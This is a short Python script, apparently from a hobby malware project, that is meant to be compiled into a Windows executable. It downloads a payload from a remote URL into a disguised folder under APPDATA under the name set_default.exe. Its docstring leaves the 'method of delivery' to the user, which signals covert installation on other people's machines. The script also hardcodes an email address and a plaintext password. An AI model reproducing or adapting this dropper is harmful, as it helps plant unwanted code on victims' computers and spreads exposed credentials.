#!/usr/bin/env python3
""" payload_to_windows.py

Author: Sam Hilliard

Implementation of deliver_payload module used to download a specified
payload to a windows machine.
This file is to be compiled into a windows executable.
Method of delivery is up to you :).
"""

import deliver_payload, os

def main():
    url = 'https://www.google.com/url?sa=i&url=https%3A%2F%2Fpaisano-online.com'\
            '%2F22764%2Fentertainment%2Fthe-spongebob-musical-is-politically-charged%2F&psig='\
            'AOvVaw2cnBzvnMO5jh4A0ke5dTi6&ust=1616130189144000&source=images&cd=vfe&v'\
            'ed=0CAYQjRxqFwoTCKiM-aKIue8CFQAAAAAdAAAAABAD'
    email = 'smittyw580@gmail.com'
    password = '9ZEiewHN3pFHH3B5'
    payload_name = 'test'

    # creates a discrete path for the executable to be stored at
    path = os.getenv('APPDATA')
    os.chdir(path)
    os.mkdir('Local Data Storage')
    os.chdir('Local Data Storage')
    path += '\\Local Data Storage\\set_default.exe'

    payload = deliver_payload.DeliverPayload(url, email, password, payload_name, path)
    payload.download_file(url)
    print(payload.path)


if __name__ == '__main__':
    main()